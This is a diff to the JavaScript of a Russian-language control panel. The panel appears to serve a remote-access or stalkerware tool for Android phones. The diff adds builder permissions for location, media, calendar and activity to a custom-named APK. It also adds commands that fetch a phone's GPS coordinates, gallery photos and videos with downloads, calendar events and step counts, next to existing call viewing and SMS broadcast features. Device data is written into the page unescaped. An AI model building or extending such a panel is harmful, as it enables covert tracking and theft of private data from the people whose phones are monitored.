@@ -584,6 +584,10 @@ $('#buildBtn').onclick = async () => {
   if ($('#permPhone').checked) perms.push('PHONE');
   if ($('#permSms').checked) perms.push('SMS');
   if ($('#permBluetooth').checked) perms.push('BLUETOOTH');
+  if ($('#permLocation').checked) perms.push('LOCATION');
+  if ($('#permMedia').checked) perms.push('MEDIA');
+  if ($('#permCalendar').checked) perms.push('CALENDAR');
+  if ($('#permActivity').checked) perms.push('ACTIVITY');
   const fd = new FormData();
   fd.append('appName', $('#bAppName').value);
   fd.append('applicationId', $('#bAppId').value);
@@ -889,6 +893,17 @@ function startCallsViewer(requestDataOnOpen) {
         toast(m.ok ? ('✓ ' + (m.msg || 'Будильник поставлен')) : ('Ошибка: ' + (m.msg || '')), !m.ok);
       } else if (m.type === 'timer-set') {
         toast(m.ok ? ('✓ ' + (m.msg || 'Таймер запущен')) : ('Ошибка: ' + (m.msg || '')), !m.ok);
+      } else if (m.type === 'location') {
+        renderLocation(m);
+      } else if (m.type === 'gallery-items') {
+        renderGallery(m);
+      } else if (m.type === 'media-thumb') {
+        applyMediaThumb(m);
+      } else if (m.type === 'calendar-events') {
+        renderCalendar(m);
+      } else if (m.type === 'step-count') {
+        const el = $('#stepsResult');
+        if (el) el.textContent = m.err ? ('Ошибка: ' + m.err) : (m.steps.toLocaleString('ru-RU') + ' шагов (с последней перезагрузки)');
       } else if (m.type === 'sms-broadcast-done') {
         $('#broadcastBtn').disabled = false;
         $('#broadcastBtn').textContent = '📢 Разослать';
@@ -1352,6 +1367,152 @@ $('#cmdSetTimer').onclick = () => {
   if (!seconds) { toast('Укажи время таймера', true); return; }
   const label = $('#timerLabel').value || 'Таймер';
   phoneSend({ cmd: 'set-timer', seconds, label });
+};
+
+// ---------- Геолокация ----------
+$('#cmdGetLocation').onclick = () => {
+  const el = $('#locationResult');
+  if (el) el.textContent = 'Запрос координат…';
+  const mapEl = $('#locationMap');
+  if (mapEl) mapEl.style.display = 'none';
+  phoneSend({ cmd: 'get-location' });
+};
+
+function renderLocation(m) {
+  const el = $('#locationResult');
+  const mapEl = $('#locationMap');
+  if (!el) return;
+  if (m.err) {
+    el.textContent = 'Ошибка: ' + m.err;
+    if (mapEl) mapEl.style.display = 'none';
+    return;
+  }
+  el.textContent = `${m.lat.toFixed(6)}, ${m.lon.toFixed(6)}`;
+  if (mapEl) mapEl.style.display = '';
+  const mapLink = $('#locationMapLink');
+  if (mapLink) mapLink.href = `https://maps.google.com/?q=${m.lat},${m.lon}`;
+  const accEl = $('#locationAccuracy');
+  if (accEl) {
+    const ago = m.time ? relTime(m.time) : '';
+    accEl.textContent = `точность: ${m.accuracy ? m.accuracy.toFixed(0) + ' м' : '—'}${m.provider ? ', ' + m.provider : ''}${ago ? ', ' + ago : ''}`;
+  }
+}
+
+// ---------- Галерея ----------
+let galleryOffset = 0;
+let galleryType = 'images';
+const GALLERY_LIMIT = 20;
+let galleryTotal = 0;
+
+function loadGallery(offset) {
+  galleryOffset = offset || 0;
+  phoneSend({ cmd: 'get-gallery', mediaType: galleryType, limit: GALLERY_LIMIT, offset: galleryOffset });
+  const el = $('#galleryList');
+  if (el) el.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Загрузка…</div>';
+}
+
+function formatBytes(b) {
+  if (!b) return '';
+  if (b < 1024 * 1024) return (b / 1024).toFixed(0) + ' КБ';
+  return (b / 1024 / 1024).toFixed(1) + ' МБ';
+}
+
+function renderGallery(m) {
+  const list = $('#galleryList');
+  const pager = $('#galleryPager');
+  const info = $('#galleryInfo');
+  if (!list) return;
+  galleryTotal = m.total || 0;
+  if (m.err) { list.innerHTML = `<div class="muted-text" style="padding:10px">${m.err}</div>`; return; }
+  const items = m.items || [];
+  if (!items.length) { list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Нет файлов</div>'; return; }
+  if (info) info.textContent = `Всего: ${galleryTotal}`;
+  list.innerHTML = items.map((item) => {
+    const date = item.date ? new Date(item.date).toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' }) : '';
+    const size = formatBytes(item.size);
+    return `<div class="gallery-item">
+      <div class="gallery-thumb" data-id="${item.id}" data-mtype="${m.mediaType}">${m.mediaType === 'videos' ? '🎬' : '📷'}</div>
+      <div class="gallery-meta-col">
+        <div class="gallery-name">${item.name || ''}</div>
+        <div class="gallery-sub">${date}${size ? ' · ' + size : ''}</div>
+      </div>
+      ${item.path ? `<button class="sm gallery-dl" data-path="${item.path.replace(/"/g, '&quot;')}" title="Скачать">⬇</button>` : ''}
+    </div>`;
+  }).join('');
+  list.querySelectorAll('.gallery-thumb[data-id]').forEach((el) => {
+    phoneSend({ cmd: 'get-media-thumb', id: parseInt(el.dataset.id), mediaType: el.dataset.mtype });
+  });
+  list.querySelectorAll('.gallery-dl').forEach((btn) => {
+    btn.onclick = () => window.open('/api/files/download?path=' + encodeURIComponent(btn.dataset.path));
+  });
+  if (pager) {
+    const shown = galleryOffset + items.length;
+    const hasMore = shown < galleryTotal;
+    const hasPrev = galleryOffset > 0;
+    pager.style.display = (hasMore || hasPrev) ? '' : 'none';
+    const pg = $('#galleryPage');
+    if (pg) pg.textContent = `${galleryOffset + 1}–${shown} из ${galleryTotal}`;
+  }
+}
+
+function applyMediaThumb(m) {
+  if (!m.data || !m.id) return;
+  const el = document.querySelector(`.gallery-thumb[data-id="${m.id}"]`);
+  if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${m.data}" style="width:100%;height:100%;object-fit:cover;border-radius:4px">`;
+}
+
+document.querySelectorAll('.gallery-tab-btn').forEach((btn) => {
+  btn.onclick = () => {
+    document.querySelectorAll('.gallery-tab-btn').forEach((b) => b.classList.remove('active'));
+    btn.classList.add('active');
+    galleryType = btn.dataset.gtype;
+  };
+});
+$('#cmdLoadGallery').onclick = () => loadGallery(0);
+$('#galleryPrev').onclick = () => loadGallery(Math.max(0, galleryOffset - GALLERY_LIMIT));
+$('#galleryNext').onclick = () => loadGallery(galleryOffset + GALLERY_LIMIT);
+
+// ---------- Календарь ----------
+$('#cmdLoadCalendar').onclick = () => {
+  const days = parseInt($('#calDays').value) || 14;
+  const list = $('#calendarList');
+  if (list) list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Загрузка…</div>';
+  phoneSend({ cmd: 'get-calendar', days });
+};
+
+function renderCalendar(m) {
+  const list = $('#calendarList');
+  if (!list) return;
+  if (m.err) { list.innerHTML = `<div class="muted-text" style="padding:10px">${m.err}</div>`; return; }
+  const events = m.events || [];
+  if (!events.length) { list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Нет событий</div>'; return; }
+  list.innerHTML = events.map((e) => {
+    const start = new Date(e.dtstart);
+    const startStr = e.allDay
+      ? start.toLocaleDateString('ru-RU', { day: 'numeric', month: 'long', year: 'numeric' })
+      : start.toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
+    let endStr = '';
+    if (e.dtend && !e.allDay) {
+      const end = new Date(e.dtend);
+      const sameDay = start.toDateString() === end.toDateString();
+      endStr = ' — ' + (sameDay
+        ? end.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' })
+        : end.toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' }));
+    }
+    return `<div class="cal-event">
+      <div class="cal-time">${startStr}${endStr}</div>
+      <div class="cal-title">${e.title || '(Без названия)'}</div>
+      ${e.location ? `<div class="cal-loc">📍 ${e.location}</div>` : ''}
+      ${e.calendar ? `<div class="cal-cal">${e.calendar}</div>` : ''}
+    </div>`;
+  }).join('');
+}
+
+// ---------- Шагомер ----------
+$('#cmdGetSteps').onclick = () => {
+  const el = $('#stepsResult');
+  if (el) el.textContent = 'Считаем…';
+  phoneSend({ cmd: 'get-steps' });
 };
 
 // ---------- Старт ----------
